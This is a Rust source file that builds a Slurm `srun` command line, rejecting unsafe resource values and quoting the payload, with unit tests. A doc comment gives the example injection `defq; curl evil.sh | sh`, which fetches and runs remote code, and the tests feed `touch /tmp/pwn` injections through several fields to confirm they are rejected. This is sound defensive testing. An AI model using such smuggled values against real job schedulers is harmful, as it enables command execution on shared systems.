//! Builds the `srun` wrapper and runs nothing: the `local` or `ssh` primitive
//! runs the string. The payload is single-quoted exactly once here (the
//! primitive does not re-quote), so it reaches the compute node's `sh -c`
//! intact.

use crate::transport::SlurmResources;

/// Punctuation a resource value may carry on top of alphanumerics. Slurm's
/// values (names, `1-12:00:00` time limits, `32G` sizes, log paths) fit in
/// it, and none of it means anything to the shell parsing the command.
const ALLOWED_PUNCTUATION: &[char] = &['.', '_', '-', ':', ',', '/', '+', '@', '='];

/// Build `[<pre_exec> && ] srun <flags> sh -c '<payload>'` for `shell_cmd`.
///
/// `job_name` becomes a sanitized `--job-name`, so jobs are identifiable in
/// `squeue` rather than all showing as `sh`. Errors when a resource value
/// carries a character the shell would act on; see [`checked`].
pub(crate) fn srun_command(
    resources: &SlurmResources,
    job_name: Option<&str>,
    shell_cmd: &str,
) -> anyhow::Result<String> {
    let mut parts = vec!["srun".to_string()];
    parts.extend(srun_flags(resources)?);
    if let Some(name) = job_name {
        parts.push(format!("--job-name={}", sanitize(name)));
    }
    if let Some(dir) = &resources.log_dir {
        let dir = checked("log_dir", dir)?;
        parts.push(format!("--output={dir}/%x-%j.out"));
        parts.push(format!("--error={dir}/%x-%j.err"));
    }
    // Verbatim by contract, unlike the resource values: `extra_srun_args` is
    // the escape hatch for unmodelled srun flags and `pre_exec` is a shell
    // snippet, so neither can be checked without taking the feature away.
    parts.extend(resources.extra_args.iter().cloned());
    parts.push("sh".into());
    parts.push("-c".into());
    parts.push(posix_quote(shell_cmd));
    Ok(crate::shell::prefix_pre_exec(
        resources.pre_exec.as_deref(),
        parts.join(" "),
    ))
}

fn srun_flags(r: &SlurmResources) -> anyhow::Result<Vec<String>> {
    let mut f = Vec::new();
    if let Some(p) = &r.partition {
        f.push(format!("--partition={}", checked("partition", p)?));
    }
    if let Some(a) = &r.account {
        f.push(format!("--account={}", checked("account", a)?));
    }
    // The numeric fields are `u32`, so they cannot render anything but digits.
    if let Some(g) = r.gpus {
        f.push(format!("--gres=gpu:{g}"));
    }
    if let Some(c) = r.cpus {
        f.push(format!("--cpus-per-task={c}"));
    }
    if let Some(t) = &r.time_limit {
        f.push(format!("--time={}", checked("time_limit", t)?));
    }
    if let Some(m) = &r.mem {
        f.push(format!("--mem={}", checked("mem", m)?));
    }
    Ok(f)
}

/// Reject a resource value the shell would not pass through untouched, so a
/// plan cannot smuggle a command onto the driver or the login node with
/// `partition = "defq; curl evil.sh | sh"`. Rejecting beats quoting: a slurm
/// identifier never needs quoting, so anything else is a plan mistake.
fn checked<'a>(field: &str, value: &'a str) -> anyhow::Result<&'a str> {
    if let Some(c) = value
        .chars()
        .find(|c| !c.is_ascii_alphanumeric() && !ALLOWED_PUNCTUATION.contains(c))
    {
        anyhow::bail!(
            "slurm resource `{field}` = {value:?} contains {c:?}; \
             values may use letters, digits and {}",
            ALLOWED_PUNCTUATION.iter().collect::<String>()
        );
    }
    Ok(value)
}

/// A `--job-name` token, which is also the `%x` in any `--output` path.
fn sanitize(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
                c
            } else {
                '_'
            }
        })
        .collect()
}

/// Single quotes suppress all expansion and parse the same in POSIX sh and
/// fish.
fn posix_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

#[cfg(test)]
mod tests {
    use rstest::rstest;

    use super::*;

    fn res() -> SlurmResources {
        SlurmResources {
            partition: Some("defq".into()),
            gpus: Some(1),
            cpus: Some(8),
            time_limit: Some("02:00:00".into()),
            ..SlurmResources::default()
        }
    }

    fn with_pre_exec(s: &str) -> SlurmResources {
        SlurmResources {
            pre_exec: Some(s.into()),
            ..SlurmResources::default()
        }
    }

    fn extras() -> SlurmResources {
        SlurmResources {
            partition: Some("defq".into()),
            account: Some("acct".into()),
            time_limit: Some("01:00:00".into()),
            mem: Some("32G".into()),
            extra_args: vec!["--exclusive".into()],
            ..SlurmResources::default()
        }
    }

    fn with_logs() -> SlurmResources {
        SlurmResources {
            partition: Some("defq".into()),
            log_dir: Some("slurm-logs".into()),
            ..SlurmResources::default()
        }
    }

    #[rstest]
    #[case::full(
        res(),
        None,
        "cd /w && run --x",
        "srun --partition=defq --gres=gpu:1 --cpus-per-task=8 --time=02:00:00 sh -c 'cd /w && run --x'"
    )]
    #[case::job_name(
        res(),
        Some("remote/eval x:Q4_0.gguf"),
        "run",
        "srun --partition=defq --gres=gpu:1 --cpus-per-task=8 --time=02:00:00 --job-name=remote_eval_x_Q4_0.gguf sh -c 'run'"
    )]
    #[case::log_dir(
        with_logs(),
        Some("m"),
        "run",
        "srun --partition=defq --job-name=m --output=slurm-logs/%x-%j.out --error=slurm-logs/%x-%j.err sh -c 'run'"
    )]
    #[case::pre_exec(
        with_pre_exec(". /etc/profile.d/modules.sh && module load slurm"),
        None,
        "run",
        ". /etc/profile.d/modules.sh && module load slurm && srun sh -c 'run'"
    )]
    #[case::extra_and_omitted(
        extras(),
        None,
        "run",
        "srun --partition=defq --account=acct --time=01:00:00 --mem=32G --exclusive sh -c 'run'"
    )]
    #[case::bare(SlurmResources::default(), None, "run", "srun sh -c 'run'")]
    #[case::single_quote(
        SlurmResources::default(),
        None,
        "echo it's",
        r"srun sh -c 'echo it'\''s'"
    )]
    fn srun_command_cases(
        #[case] resources: SlurmResources,
        #[case] job_name: Option<&str>,
        #[case] shell_cmd: &str,
        #[case] expected: &str,
    ) -> anyhow::Result<()> {
        assert_eq!(srun_command(&resources, job_name, shell_cmd)?, expected);
        Ok(())
    }

    #[rstest]
    #[case::partition(
        SlurmResources {
            partition: Some("defq; touch /tmp/pwn".into()),
            ..SlurmResources::default()
        },
        "partition"
    )]
    #[case::account(
        SlurmResources {
            account: Some("acct$(touch /tmp/pwn)".into()),
            ..SlurmResources::default()
        },
        "account"
    )]
    #[case::time_limit(
        SlurmResources {
            time_limit: Some("02:00:00 && touch /tmp/pwn".into()),
            ..SlurmResources::default()
        },
        "time_limit"
    )]
    #[case::mem(
        SlurmResources {
            mem: Some("32G`touch /tmp/pwn`".into()),
            ..SlurmResources::default()
        },
        "mem"
    )]
    #[case::log_dir(
        SlurmResources {
            log_dir: Some("logs|touch /tmp/pwn".into()),
            ..SlurmResources::default()
        },
        "log_dir"
    )]
    fn injected_resource_values_are_rejected(
        #[case] resources: SlurmResources,
        #[case] field: &str,
    ) -> anyhow::Result<()> {
        match srun_command(&resources, Some("m"), "run") {
            Ok(cmd) => anyhow::bail!("reached the command line: {cmd}"),
            Err(err) => {
                let msg = err.to_string();
                assert!(msg.contains(field), "error must name the field: {msg}");
                Ok(())
            }
        }
    }
}
